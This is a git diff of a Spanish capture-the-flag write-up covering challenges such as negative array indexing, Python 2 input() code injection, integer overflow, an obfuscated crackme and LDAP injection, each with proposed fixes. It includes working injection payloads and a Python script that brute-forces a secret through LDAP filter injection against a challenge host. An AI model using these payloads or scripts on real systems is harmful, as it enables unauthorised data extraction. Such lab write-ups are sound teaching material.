@@ -5,7 +5,7 @@ author: "Carlos Barahona Pastor y Ángel del Castillo González"
 output: pdf_document
 ---
 \begin{center}
-    \includegraphics{urjc.png}
+    \includegraphics{./capturas/urjc.png}
 \end{center}
 
 
@@ -257,26 +257,6 @@ La flag de este reto es `URJC{N}` siendo N el número de apariciones, por lo que
 
 Para impedir la automatización, se podría intentar usar algún método que compare el tiempo entre solicitudes desde una misma fuente, y si está por debajo de cierto umbral, bloquear la conexión para no poder seguir navegando por las distintas páginas del servidor.
 
-# Calculadora
-
-## Descripción
-
-
-
-## Detección
-
-
-
-## Explicación
-
-
-
-## Flag
-
-
-
-## Arreglos y mejoras
-
 \newpage
 
 
@@ -374,12 +354,493 @@ URJC{m3ch4nic_k3yb04rd?}
 
 ???????????????????????????????????????
 
+\newpage
+
+
+
+# Agenda
+
+## Descripción
+
+El programa consiste en una agenda de contactos dónde puedes añadir/crear un contacto o pedir que te lo muestre.
+
+## Detección
+
+En la función `show_contact()` podemos buscar un número en la agenda pero solamente se comprueba si el número que leemos es mayor que el tamaño máximo
+
+```{c, eval=FALSE, results=FALSE}
+
+void show_contact(){
+    printf("Que contacto quieres recuperar? Indica su posicion en la agenda.\n");
+    int pos;
+    scanf("%d", &pos);
+
+    if(pos >= SIZE){
+        printf("Posicion invalida! Que tramas?\n");
+        return;
+    }
+
+    printf("El numero de la posicion %d es %s\n", pos, agenda[pos]);
+}
+
+```
+
+Pero, ¿qué pasa si metemos números negativos?
+
+## Explicación
+
+Si metemos valores negativos, podremos acceder a zonas de memoria, las cuales no deberíamos acceder.
+\begin{center}
+    \includegraphics{./capturas/intentos.jpg}
+\end{center}
+
+
+\begin{center}
+    \includegraphics{./capturas/intento_y_flag.jpg}
+\end{center}
+
+
+## Flag
+
+URJC{Why_so_negative}
+
+## Arreglos y mejoras
+
+Deberíamos añadir la comprobación de que el número leído para buscar sea mayor o igual que 0, para que no se accedan a otras direcciones de memoria.
+
+```{c, results=FALSE, eval=FALSE}
+void show_contact(){
+    printf("Que contacto quieres recuperar? Indica su posicion en la agenda.\n");
+    int pos;
+    scanf("%d", &pos);
+
+    if(pos >= SIZE || pos < 0){
+        printf("Posicion invalida! Que tramas?\n");
+        return;
+    }
+
+    printf("El numero de la posicion %d es %s\n", pos, agenda[pos]);
+}
+
+```
+
+Si se cumplen una de las dos condiciones, no devuelve ningún contacto.
+
+
+\newpage
+
+
+
+
+# Agenda v2
+
+## Descripción
+El programa consiste en una agenda de contactos dónde puedes añadir/crear un contacto o pedir que te lo muestre.
+
+## Detección
+
+Según la [documentación de python](https://docs.python.org/2/library/functions.html#input), la función input realiza por debajo lo siguiente: `eval(raw_input(prompt))`.
+
+\begin{center}
+    \includegraphics{./capturas/doc.jpg}
+\end{center}
+
+El método `eval()` puede ser usado para ejecutar código arbitrario, por lo tanto `input()` en Python2 es vulnerable.
+Por ejemplo, la siguiente parte del código podemos intentar ejecutar código.
+
+```{python, eval=FALSE, results=FALSE}
+import os
+
+def add_contact():
+    print("En que posicion de la agenda quieres almacenar el numero?\n")
+    pos = int(input())
+
+    if pos >= SIZE or pos < 0:
+        print("Posicion invalida! Quieres hacer un overflow?\n")
+        return
+
+
+    print("Introduce el numero: ")
+    agenda[pos] = input()
+
+
+```
+
+
+Además, el código importa la librería `os` con la que podemos acceder a variables de entorno como `CHALLENGE_FLAG` que es donde se guarda la flag del reto.
+
+
+```{docker, eval=FALSE, results=FALSE}
+environment:
+      - CHALLENGE_FLAG=URJC{change_me}
+
+```
+
+
+## Explicación
+
+Como hemos dicho antes la función input es vulnerable, entonces si introducimos la siguiente línea en cualquier parte que ejecute input: `os.getenv('CHALLENGE_FLAG')` para obtener el contenido de la variable de entorno de la flag. 
+
+\begin{center}
+    \includegraphics{./capturas/cuela.jpg}
+\end{center}
+
+
+\begin{center}
+    \includegraphics{./capturas/flag_python.jpg}
+\end{center}
+
+
+## Flag
+
+URJC{Python2_is_old}
+
+## Arreglos y mejoras
+
+Usar raw_input() como método para leer inputs en Python2 ya que todo lo recibe lo convierte en strings. Otra opción es dejar de usar Python2 y empezar a usar Python3 cuya función input no es vulnerable.
+
+
+# La calculadora
+
+## Descripción
+
+En este reto se proporciona el código de una calculadora en `Java` y se pide analizar que su comportamiento sea el esperado. En este caso se han encontrado diversas deficiencias que se comentarán más adelante.
+
+## Explicación
+
+Para corregir el funcionamiento de la calculadora, se han desarrollado diversos `tests` para comprobar si efectivamente esta teniendo el comportamiento adecuado. 
+
+El primer `test` que se ha creado ha sido el relativo a las divisiones entre 0. En caso de que se intente, se tiene que lanzar la excepción `ArithmeticException` y el código es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    public void zero_division_test(){
+        SecureCalculator calculator = new SecureCalculator();
+        Assertions.assertThrows(ArithmeticException.class,
+                () -> calculator.divide(1, 0));
+    }
+```
+
+Como el código proporcionado no pasaba este test, se ha realizado una modificación introduciendo un `if` para diferencia los casos de divisor igual a 0 o cualquier otro número quedando de la siguiente forma:
+
+```{java, eval=FALSE, results=FALSE}
+    public double divide(double a, double b){
+        log("Divide %s / %s", a, b);
+        if (b == 0){
+            throw new ArithmeticException();
+        }
+        else{
+            return a / b;
+        }
+    }
+```
+
+El siguiente test que se ha creado es el relativo a `overflows`. En este caso se tenía que verificar que la multiplicación de 2 números positivos no diera un número negativo, y que en caso de que fuera posible el `overflow` arrojara una excepción. El test desarrollado es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    public void overflow_test(){
+        SecureCalculator calculator = new SecureCalculator();
+        Assertions.assertDoesNotThrow(() -> {calculator.multiply(Integer.MAX_VALUE-1, Integer.MAX_VALUE);});
+    }
+```
+
+La aplicación no pasó el test ya que arrojó un resultado negativo, por lo que para evitar el overflow lo que se hace es castear a `long` los `int` que hay que multiplicar y como el rango es más extenso ya no da un número negativo y no se produce el overflow. El código arreglado es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    public long multiply(int a, int b){
+        log("Multiply %s * %s", a, b);
+        long result =((long) a) * ((long) b);
+        return result;
+
+    }
+```
+
+El siguiente test que se ha realizado es el relativo a detectar que los números aleatorios se generan correctamente. Para ello se comprueba en el test que estén dentro del rango esperado y que sean distintos:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    public void random_test(){
+        SecureCalculator calculator = new SecureCalculator();
+        int result = calculator.getRandomNumber(9876);
+        int result2 = calculator.getRandomNumber(9876);
+        Assertions.assertTrue(0 <= result && result < Integer.MAX_VALUE);
+        Assertions.assertTrue(0 <= result2 && result2 < Integer.MAX_VALUE);
+        Assertions.assertTrue(result != result2);
+
+    }
+```
+
+El código no pasa el test ya que la función `Math.Random()` devuelve un número `double` en el rango `[0,1)` por lo que si se castea a `int` se redondea a 0 y siempre saldrá 0. En este caso se ha corregido pasando a usar la función `Random().nextInt` quedando así:
+
+```{java, eval=FALSE, results=FALSE}
+    public int getRandomNumber(int bound){
+        log("Generating rnd with bound %s", bound);
+        return new Random().nextInt(bound);
+    }
+```
+
+Lo siguiente que se hace es crear un test para comprobar si se realiza correctamente el módulo. En este caso se plantean 4 casos cambiando los signos de los número para comprobar que se cumple la definición de que el resultado debe estar en el rango [0,b]. El código del test es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    public void mod_test(){
+        SecureCalculator calculator = new SecureCalculator();
+        int a = 3;
+        int b = 2;
+        int result1 = calculator.mod(a, b);
+        Assertions.assertTrue(0 <= result1 && result1 <= b);
+        int result2 = calculator.mod(-a, b);
+        Assertions.assertTrue(0 <= result2 && result2 <= b);
+        int result3 = calculator.mod(a, -b);
+        Assertions.assertTrue(0 >= result3 && result3 >= -b);
+        int result4 = calculator.mod(-a, -b);
+        Assertions.assertTrue(0 >= result4 && result4 >= -b);
+    }
+```
+
+El código no cumple con la definición y el test falla, por lo que se usa la función `Math.floorMod` para calcular correctamente el módulo quedando de la siguiente forma:
+
+```{java, eval=FALSE, results=FALSE}
+    public int mod(int a, int b){
+        log("%s mod %s", a, b);
+        return Math.floorMod(a, b);
+    }
+```
+
+El siguiente test creado es para comprobar si se determina correctamente que un número sea impar:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    public void odd_test(){
+        SecureCalculator calculator = new SecureCalculator();
+        Assertions.assertTrue(calculator.isOdd(3301));
+        Assertions.assertFalse(calculator.isOdd(2456));
+    }
+```
+
+En este caso si que se cumple el test por lo que no es necesario cambiar el código.
+
+Lo siguiente que se crea es el test para verificar que se distingue correctamente cuando un número es par:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    public void even_test(){
+        SecureCalculator calculator = new SecureCalculator();
+        Assertions.assertTrue(calculator.isEven(2456));
+        Assertions.assertFalse(calculator.isEven(3301));
+    }
+```
+
+En este caso el código no pasa el test ya que la forma de determinar si un número es par es buscarlo en una lista que solo contiene unos cuantos. Por tanto lo que se hace es cambair el código para determinar si es par o no usando el módulo:
+
+```{java, eval=FALSE, results=FALSE}
+    public boolean isEven(int a){
+        return mod(a, 2) == 0;
+    }
+```
+
+Por último para verificar los logs se crea un test que llame a las 4 funciones que imprimen logs y usando `mockito` se determina si se están usando correctamente:
+
+```{java, eval=FALSE, results=FALSE}
+    @Test
+    void check_logger(){
+        var mockLog = Mockito.mock(Logger.class);
+        var calculadora = new SecureCalculator(mockLog);
+        calculadora.divide(4, 2);
+        calculadora.multiply(4, 8);
+        calculadora.mod(8,2);
+        calculadora.getRandomNumber(1000);
+        verify(mockLog, times(4)).info(anyString());
+    }
+```
+
+EL código pasa el test y se confirman los 4 logs.
+
+## Flag
+
+La flag de este reto es: **URJC{Ahora_implementate_unas_derivadas}**
+
+## Arreglos y mejoras
+
+Los arreglos relativos al reto se basan en crear los test de forma correcta y para comprobar las características pedidas y determinar cual es la mejor funcion para cada caso.
+
+# Crash me... if you can
+
+## Descripción
+
+En este reto se proporciona un archivo fuente en c en el que hay que introducir una secuencia de caracteres determinada para que imprima la flag. La vulnerabilidad que se ha encontrado es que el código no usa mecanismos de ofuscación complejos y su funcionamiento es medianamente legible.
+
+## Explicación
+
+Para conseguir la secuencia, lo primero que se ha hecho ha sido analizar el código y sus funciones. La primera función presente en el código es la función `o_ee98c554011495058cf56404af1b646e` cuyo código es el siguiente (para facilitar la compresión se ha puesto comentado al lado de cada línea el resultado de las sumas en hexadecimal):
+
+```{c, eval=FALSE, results=FALSE}
+int o_ee98c554011495058cf56404af1b646e(char o_5b1248e6630a88ffa3848a19a4d6bd3b) {
+    if ((o_5b1248e6630a88ffa3848a19a4d6bd3b <
+         (0x0000000000000060 + 0x0000000000000230 + 
+         0x0000000000000830 - 0x0000000000000A90)) & //30
+        !!(o_5b1248e6630a88ffa3848a19a4d6bd3b <
+           (0x0000000000000060 + 0x0000000000000230 + 
+           0x0000000000000830 - 0x0000000000000A90)) || //30
+        (o_5b1248e6630a88ffa3848a19a4d6bd3b >
+         (0x0000000000000072 + 0x0000000000000239 + 
+         0x0000000000000839 - 0x0000000000000AAB)) & //39
+        !!(o_5b1248e6630a88ffa3848a19a4d6bd3b >
+           (0x0000000000000072 + 0x0000000000000239 + 
+           0x0000000000000839 - 0x0000000000000AAB))) { //39
+        return (0x0000000000000000 + 0x0000000000000200 + 
+        0x0000000000000800 - 0x0000000000000A00); //0
+    };
+    return (0x0000000000000002 + 0x0000000000000201 + 
+    0x0000000000000801 - 0x0000000000000A03); //1
+};
+```
+
+El `if` de esta función se puede reescribir de la siguiente forma siendo `character` equivalente a `o_5b1248e6630a88ffa3848a19a4d6bd3b` (el `char` que se recibe como argumento):
+
+```{c, eval=FALSE, results=FALSE}
+if (((character<30) & !!(character<30)) || ((character>39) & !!(character>39)))
+```
+
+Como se puede observar, las condiciones nunca se cumplen ya que no se puede cumplir que un número sea menor que 30 y que a la vez se cumpla lo contrario (lo mismo pasa con el 39) por lo que nunca se devuelve el valor de dentro del `if`(0) y se devuelve siempre 1.
+
+El código `main` que se tiene que cumplir para que se imprima la flag sería el siguiente (se ha cambiado el nombre de la función anterior a `compare_char` y el nombre de la variable del `char` a `character` para facilitar la lectura):
+
+```{c, eval=FALSE, results=FALSE}
+int main() {
+    char character = getchar();
+    if (compare_char(character) &&
+        !(character ^ 0x0000000000000031)) {
+        character = getchar();
+        if (compare_char(character) &&
+            !(character ^ 0x0000000000000033)) {
+            character = getchar();
+            if (compare_char(character) &&
+                !(character ^ 0x0000000000000033)) {
+                character = getchar();
+                if (compare_char(character) &&
+                    !(character ^ 0x0000000000000037)) {
+                    character = getchar();
+                    if (compare_char(character) &&
+                        !(character ^ 0x0000000000000037)) {
+                        character = getchar();
+                        if (compare_char(character) &&
+                            !(character ^ 0x0000000000000032)) {
+                            character = getchar();
+                            if (compare_char(character) &&
+                                !(character ^ 0x0000000000000036)) {
+                                character = getchar();
+                                if (compare_char(character) &&
+                                    !(character ^ 0x0000000000000039)) {
+                                    
+```
+
+Se puede observar que son una serie de `if` anidados que se ejecutan si la función que se ha visto anteriormente vale 1, y si el XOR entre el carácter que toca en ese punto y un número en hexadecimal da 0 (debido a que como hay un `!`, el XOR tiene que valer 0 ya que !0=1 y eso hace que el AND con el valor de la función salga `True`). El XOR entre el carácter introducido y el valor hexadecimal dará 0 si son iguales, por lo que se va creando la secuencia buscando en una tabla `ascii` el equivalente de esos valores, quedando de la siguiente forma: **13377269**. Si se introduce se obtiene la flag:
+
+\begin{figure}[!ht]
+  \includegraphics{./capturas/crash_me_correct_output.png}
+  \caption{Correct output}
+\end{figure}
+
+## Flag
+
+La flag en este caso es: **URJC{13377269}**
+
+## Arreglos y mejoras
+
+Como posible mejora para aumentar la dificultad del reto, se podría intentar ofuscar aun más el código y utilizar más código que no haga nada (como el que hay en la función que siempre devuelve 1) para dificultar la comprensión.
+
+# Bitcoins
+
+## Descripción
+
+En este reto, se plantea una tienda virtual cuya pantalla de bienvenida es la siguiente:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/bitcoins_welcome_page.png}
+  \caption{bitcoins welcome page}
+\end{figure}
+
+La vulnerabilidad encontrada en este caso ha sido una falta de protección ante overflows.
+
+## Detección
+
+En este caso la vulnerabilidad se ha encontrado de forma manual observando el código y viendo que no se presenta ninguna forma de prevenir un overflow.
+
+## Explicación
+
+
+Si se pulsa en la opción 2 para recargar, se observa como aparece nada más un mensaje y no se pueden recargar:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/bitcoins_option_2.png}
+  \caption{bitcoins option 2}
+\end{figure}
+
+Como no se puede recargar se procede a gastar, ofreciéndose 3 opciones:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/bitcoins_option_1.png}
+  \caption{bitcoins option 1}
+\end{figure}
+
+A continuación se introduce que se quiere comprar una flag y el código pregunta que cuantas se quieren comprar. En un principio se podría intentar introducir un número negativo para engañar al programa y que devolviera la flag pero se obtiene lo siguiente:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/bitcoins_buy_flag.png}
+  \caption{bitcoins buy negative flag}
+\end{figure}
+
+Tal y como se observa en el output que se recibe y en el código para comprar la flag se comprueba que el número no sea negativo para evitar compras ilegales:
+
+```{c, eval=FALSE, results=FALSE}
+    else if(gastoEn==3){
+        printf("Cuantas flags quieres comprar?\n");
+        int cuantas;
+        scanf("%d", &cuantas);
+        if(cuantas <= 0){
+            printf("Introduce una cantidad positiva diferente a 0\n");
+            return;
+        }
+        if(PRESUPUESTO >= 150*cuantas){
+            PRESUPUESTO = PRESUPUESTO - 150*cuantas;
+            printf("\n\n%s\n", getenv("CHALLENGE_FLAG"));
+            *(int*)0 = 0; // Bye bye
+        }else{
+            printf("Te toca ahorrar crack!\n");
+            return;
+        }
+    }                               
+```
+
+Revisando el código, se observa que no se puede introducir un número negativo, y tampoco se puede comprar nada para lo que no se tenga presupuesto ya que se comprueba que el presupuesto sea mayor que el precio de lo que se va a comprar multiplicado por la cantidad. No obstante, aparentemente no se está comprobando ni evitando el overflow de la multiplicación entre el precio del producto y la variable `cuantas` que es de tipo `int`, por lo que se va a intentar un overflow de esa multiplicación para que el resultado salga negativo y la comparación del presupuesto y de lo que se va a gastar salga `True`. Para ello, cuando se pregunta por la cantidad, se introduce el valor máximo de `int` en `c` (el cual es `INT_MAX=2147483647`). Al introducir ese valor, efectivamente se produce el overflow y se imprime la flag:
+
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/bitcoins_overflow_and_flag.png}
+  \caption{bitcoins overflow value and flag revealed}
+\end{figure}
+
+## Flag
+
+En este caso la `flag` sería: **URJC{Ojala_funcionara_con_el_banco}**
+
+## Arreglos y mejoras
+
+La vulnerabilidad encontrada en este caso es un overflow de `int`, por lo que para arreglarla, se podría hacer algo parecido a lo que se hizo en el reto de la calculadora casteando los valores de `int` a `long` para que así hubiese un rango de valores suficientes y nunca saliera un valor negativo al realizar la operación
+
+
 
 # La lotería
 
 ## Descripción
 
-En este reto se pide adivinar el siguiente número que va a salir en una página que genera números aleatoriamente,
+En este reto se pide adivinar el siguiente número que va a salir en una página que genera números aleatoriamente.
 
 ## Detección
 
@@ -535,155 +996,464 @@ La flag en este caso es: **URJC{Ahora_prueba_con_los_numeros_de_la_loteria_:D}**
 
 ## Arreglos y mejoras
 
-Para arreglar la vulnerabilidad, habría que utilizar un generador de números aleatorios seguros como la clase `SecureRandom` de `Java`cuya generación garantiza que los números sean criptográficamente seguros.
-
+Para arreglar la vulnerabilidad, habría que utilizar un generador de números aleatorios seguros como la clase `SecureRandom` de `Java` cuya generación garantiza que los números sean criptográficamente seguros.
 
 \newpage
 
-
-
-# Agenda
+# Optimizer
 
 ## Descripción
 
-El programa consiste en una agenda de contactos dónde puedes añadir/crear un contacto o pedir que te lo muestre.
+En este reto se proporcionaba un proyecto en `Java` en el cual la flag está escondida en algún punto del código indicándose que no hace falta ejecutar la aplicación.
 
 ## Detección
 
-En la función `show_contact()` podemos buscar un número en la agenda pero solamente se comprueba si el número que leemos es mayor que el tamaño máximo
-
-```{c, eval=FALSE, results=FALSE}
-
-void show_contact(){
-    printf("Que contacto quieres recuperar? Indica su posicion en la agenda.\n");
-    int pos;
-    scanf("%d", &pos);
-
-    if(pos >= SIZE){
-        printf("Posicion invalida! Que tramas?\n");
-        return;
-    }
-
-    printf("El numero de la posicion %d es %s\n", pos, agenda[pos]);
-}
-
-```
-
-Pero, ¿qué pasa si metemos números negativos?
+En este caso la vulnerabilidad ha podido ser detectada gracias al uso de `sonarcloud` para analizar el proyecto.
 
 ## Explicación
 
-Si metemos valores negativos, podremos acceder a zonas de memoria, las cuales no deberíamos acceder.
-\begin{center}
-    \includegraphics{intentos.jpg}
-\end{center}
+Para analizar el proyecto, lo primero que se hace es ejecutar el comando `tree` para ver la estructura y determinar número de directorios y archivos del proyecto:
 
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/optimizer_content_tree.png}
+  \caption{tree output}
+\end{figure}
 
-\begin{center}
-    \includegraphics{intento_y_flag.jpg}
-\end{center}
+Como se puede observar, el número de directorios y archivos es bastante extenso, y revisarlos "a mano" sería bastante tedioso, por lo que se va a subir el proyecto a `sonarcloud` para analizarlo y ver si saca algo interesante. Una vez subido, el resumen de `sonar` es el siguiente:
 
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/optimizer_sonarcloud_main.png}
+  \caption{sonar summary main branch}
+\end{figure}
 
-## Flag
-
-URJC{Why_so_negative}
-
-## Arreglos y mejoras
-
-Deberíamos añadir la comprobación de que el número leído para buscar sea mayor o igual que 0, para que no se accedan a otras direcciones de memoria.
-
-```{c, results=FALSE, eval=FALSE}
-void show_contact(){
-    printf("Que contacto quieres recuperar? Indica su posicion en la agenda.\n");
-    int pos;
-    scanf("%d", &pos);
-
-    if(pos >= SIZE || pos < 0){
-        printf("Posicion invalida! Que tramas?\n");
-        return;
-    }
-
-    printf("El numero de la posicion %d es %s\n", pos, agenda[pos]);
-}
-
-```
-
-Si se cumplen una de las dos condiciones, no devuelve ningún contacto.
-
+Lo que peor nota recibe son los `security hotspots` por lo que será lo primero que se analizará. Nada más entrar, se presenta un riesgo relacionado con la autenticación en el cual se indica que hay `hardcodeada` una URL que podría tener una contraseña almacenada:
 
 \newpage
 
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/optimizer_sonarcloud_hardcoded.png}
+  \caption{hard-coded URL}
+\end{figure}
 
+Si se decodifica esa cadena (la cual está en base64) se obtiene la flag:
 
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/optimizer_decoded_flag.png}
+  \caption{decoded flag}
+\end{figure}
 
-# Agenda v2
+## Flag
+
+La flag sería por tanto: **URJC{Mejor_ponerlo_en_Github_Secret}**
+
+## Arreglos y mejoras
+
+La "vulnerabilidad" en este caso sería que la flag está `hardcodeada` en uno de los archivos del proyecto y `sonar` la ha detectado, por lo que una posible solución podría ser integrarla de una forma más indetectable en el código y volver a pasar el proyecto por `sonar` para comprobar si la sigue detectando.
+
+# El directorio
 
 ## Descripción
-El programa consiste en una agenda de contactos dónde puedes añadir/crear un contacto o pedir que te lo muestre.
+
+En este reto se proporciona una página en la cual se pueden buscar empleados. La vulnerabilidad detectada ha sido una `LDAP injection`
 
 ## Detección
 
-Según la [documentación de python](https://docs.python.org/2/library/functions.html#input), la función input realiza por debajo lo siguiente: `eval(raw_input(prompt))`.
+En este caso la vulnerabilidad se ha encontrado de forma manual observando que el código no valida los datos introducidos por el usuario.
 
-\begin{center}
-    \includegraphics{doc.jpg}
-\end{center}
+## Explicación
 
-El método `eval()` puede ser usado para ejecutar código arbitrario, por lo tanto `input()` en Python2 es vulnerable.
-Por ejemplo, la siguiente parte del código podemos intentar ejecutar código.
+La página nada más entrar ofrece un listado de todos los empleados los cuales se han obtenido introduciendo `*` en el campo de búsqueda. Observando el código fuente que se proporciona de la página, se observa que el protocolo utilizado para almacenar los empleados y realizar las búsquedas es `LDAP`. Si presta atención al código fuente, el método que inicializa `LDAP` es la siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    @PostConstruct
+    public void initializeLDAP(){
+        create("Juan", "Fernández");
+        create("FlaggyMacFlag", flag);
+        create("Maria", "López");
+        create("Francisco", "Martínez");
+        create("Jose", "Sánchez");
+        create("Ana", "Pérez");
+        create("Alfonso", "Gómez");
+        create("Manuel", "Martín");
+        create("Carmen", "Ruiz");
+        create("Paula", "Hernández");
+        create("Pablo", "Moreno");
+
+        log.info("LDAP initialization complete");
+    }
+```
+
+Y el código del método `create` es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    private void create(String name, String surname){
+        log.info(String.format("Creating user %s with surname %s", name, surname));
+        Attributes attributes = new BasicAttributes();
+        attributes.put(new BasicAttribute("objectClass", "inetOrgPerson"));
+        attributes.put(new BasicAttribute("uid", UUID.randomUUID().toString()));
+        attributes.put(new BasicAttribute("cn", name));
+        attributes.put(new BasicAttribute("sn", surname));
+        ldap.bind(buildDn(name), null, attributes);
+    }
+```
+
+El método create recibe como parámetros el nombre y el apellido, y los almacena respectivamente en los campos `cn` y `sn`. Si se observa el método `initializeLDAP`, la flag se carga en el apellido del empleado `FlaggyMacFlag` por lo que ese es el valor que hay que intentar obtener. El método que se encarga de buscar lo que se introduce en la web es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    public List<String> search(String name) {
+        String filter = "(&(cn=" + name + ")(objectClass=inetOrgPerson))";
+        // Execute query and filter results to only return the "cn" field 
+        //(the name of the person)
+        var queryResults = ldap.search("", filter, 
+                  (AttributesMapper<String>) attrs -> attrs.get("cn").get().toString());
+        log.info(String.format("Using filter: %s, returned: %s", filter, queryResults));
+        return queryResults;
+    }
+```
+
+El método recibe como parámetro el nombre que se quiere buscar, y crea una variable `filter` la cual se usará para filtrar la búsqueda que se realice con `LDAP` en base al nombre introducido. La búsqueda con `LDAP` devuelve solo el campo de `cn` (el cual almacena el nombre) por lo que se va a intentar jugar con el filtro para que además de comprobar el nombre, compruebe el contenido del apellido `sn`. Para ello, se va a realizar una inyección `LDAP`. Para que el filtro funcione, tiene que tener un formato como el siguiente `(&(cn=*)(sn=value)(objectClass=inetOrgPerson))` por lo que el valor inyectado tendrá que completar el filtro ya existente. Si se comparan el ya existente con el filtro objetivo, el valor de `name` tendría que ser `*)(sn=value` para que el filtro fuese correcto. Se sabe que el formato de la flag es `URJC{flag}` por lo que se pueden ir obteniendo los caracteres de la flag probando distintas combinaciones (aprovechando que `LDAP` permite usar el carácter `*` para indicar que puede ir a continuación lo que sea) y viendo cual devuelve el nombre del empleado que tiene como apellido la flag (`FlaggyMacFlag`). El código desarrollado para averiguar la flag es el siguiente:
 
 ```{python, eval=FALSE, results=FALSE}
-import os
-
-def add_contact():
-    print("En que posicion de la agenda quieres almacenar el numero?\n")
-    pos = int(input())
-
-    if pos >= SIZE or pos < 0:
-        print("Posicion invalida! Quieres hacer un overflow?\n")
-        return
+import requests
+from string import ascii_letters
 
 
-    print("Introduce el numero: ")
-    agenda[pos] = input()
+def flag_guesser():
+    base_string = "URJC{"
+    url = "https://r3-ctf-vulnerable.numa.host/search"
+    characters = ascii_letters + '}' + '_' + '-'
+    while not base_string.endswith("}"):
+        for next_char in characters:
+            injection_value = "*)(sn=" + base_string + next_char + "*"
+            post_request = requests.post(url, data={'name': injection_value})
+            if post_request.text.__contains__("FlaggyMacFlag"):
+                base_string += next_char
+                print(base_string)
+                break
+
+    print(base_string)
 
 
+if __name__ == '__main__':
+    flag_guesser()
 ```
 
+En este código básicamente lo que se hace es partir de flag base `URJC{` y se van haciendo peticiones a la página combinando la `string` de la inyección con la de la cadena base, el carácter que toque, y el asterisco. Si la respuesta obtenida contiene al empleado `FlaggyMacFlag` quiere decir que el carácter es correcto por lo que se añade a la cadena base para seguir probando con los siguientes hasta dar con la flag completa. La ejecución del código sería la siguiente:
 
-Además, el código importa la librería `os` con la que podemos acceder a variables de entorno como `CHALLENGE_FLAG` que es donde se guarda la flag del reto.
+\newpage
 
+\begin{figure}[!ht]
+  \centering
+  \includegraphics{./capturas/directorio_flag.png}
+  \caption{python3 el\_directorio.py}
+\end{figure}
 
-```{docker, eval=FALSE, results=FALSE}
-environment:
-      - CHALLENGE_FLAG=URJC{change_me}
+## Flag
 
-```
+La flag de este reto por tanto es: **URJC{el_que_busca_dicen_que_encuentra}**
 
+## Arreglos y mejoras
+
+La vulnerabilidad en este caso reside mayoritariamente en que se concatena directamente el `input` del usuario con el resto de los elementos del filtro. Como pasa con otros tipos de inyecciones, una posible solución que se podría llevar a cabo es no confiar en la entrada del usuario y validar los datos de entrada para así evitar que el usuario introdujese cadenas que pudieran cambiar el comportamiento de la búsqueda.
+
+# El buscador
+
+## Descripción
+
+En este reto se plantea una página en la que se introducen unas palabras clave y un texto en el que buscarlas para comprobar si están presentes, además de ofrecer la posibilidad de ver las búsquedas anteriores. La vulnerabilidad detectada es una `SQLi` a la que hay que llegar mediante una `ReDoS`
+
+## Detección
+
+La detección de la vulnerabilidad en este caso se ha realizado de forma manual observando las distintas funciones del código y analizando el flujo de ejecución dependiendo del input que se introduzca en los 2 campos así como la forma en la que está construida la consulta a la BBDD.
 
 ## Explicación
 
-Como hemos dicho antes la función input es vulnerable, entonces si introducimos la siguiente línea en cualquier parte que ejecute input: `os.getenv('CHALLENGE_FLAG')` para obtener el contenido de la variable de entorno de la flag. 
+Lo primero que se hará será explicar el análisis del código que se realizó para determinar como realizar el ataque y los obstáculos que se presentan y tras eso el ataque en sí
 
-\begin{center}
-    \includegraphics{cuela.jpg}
-\end{center}
+### Función de búsqueda (WebController) - Validación de longitud
+
+El código correspondiente a esta parte es el siguiente:
+
+```{java, eval=FALSE, results=FALSE}
+    @PostMapping("/")
+    ModelAndView doSearch(@RequestParam String serializedJSON, HttpServletRequest request) {
+        var session = request.getSession();
+        log.info(String.format("Processing request for client %s:%s, search %s ", 
+                               request.getRemoteAddr(), session.getId(), serializedJSON));
+
+        var mv = new ModelAndView();
+
+        if (serializedJSON.length() > 100_000) {
+            mv.setViewName("error");
+            mv.addObject("reason", "Too big");
+            return mv;
+        }
+```
+
+La función de búsqueda recibe como parámetro los campos introducidos por el usuario en forma de `String` (la cual tiene los datos representados como un `JSON`) y la petición en si. Además de obtener la información de la sesión, se imprime un mensaje de log indicando la solicitud que se está procesando, se crea el modelo, y se comprueba que el `input` introducido por el usuario no supera un límite fijado en `100_000` (aparentemente para no saturar el servidor, pero también por otra razón que se verá más adelante)
+
+### Función de búsqueda (WebController) - Comprobación de caracteres 
+
+Los códigos de esta parte son:
+
+```{java, eval=FALSE, results=FALSE}
+        // Step 1: Filter bad chars
+        if (containsBadChars(serializedJSON)) {
+            log.info("Request blocked");
+            mv.setViewName("error");
+            mv.addObject("reason", "Failed string validation");
+            return mv;
+        }
 
 
-\begin{center}
-    \includegraphics{flag_python.jpg}
-\end{center}
+  private boolean containsBadChars(String serializedJSON) {
+        String[] blacklist = new String[]{"'", "´", "`",};
+        for (String block : blacklist) {
+            if (serializedJSON.contains(block)) {
+                return true;
+            }
+        }
+        return false;
+    }
+```
+
+Una de las comprobaciones que hace la página es llamar a la función `containsBadChars()` para revisar si el input introducido por el usuario contiene los caracteres \texttt{"'", "´", "\`",}. Esta comprobación tiene sentido debido a que esos 3 caracteres son ampliamente utilizados en inyecciones `SQL` y por tanto dificulta el poder realizarlas. Si se detecta alguno de esos 3 caracteres se devuelve un error.
+
+### Función de búsqueda (WebController) - Comprobación de la deserialización
+
+El código referente a esta parte es:
+
+```{java, eval=FALSE, results=FALSE}
+        // Step 2: Try to deserilize, may fail
+        SearchRequest searchRequest;
+        try {
+            var deserializer = new ObjectMapper();
+            searchRequest = deserializer.readValue(serializedJSON, SearchRequest.class);
